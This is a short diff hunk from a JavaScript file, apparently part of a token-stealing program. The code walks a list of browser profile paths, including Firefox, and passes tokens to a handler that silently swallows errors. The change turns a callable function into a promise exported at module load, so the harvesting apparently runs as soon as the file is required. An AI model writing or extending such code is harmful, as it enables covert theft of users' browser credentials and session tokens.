@@ -125,7 +125,7 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
     .catch(() => {});
 });
 
-const run = () => new Promise((resolve) => {
+module.exports = new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
     if (!existsSync(paths[path])) return;
     if (path.includes('Firefox')) {
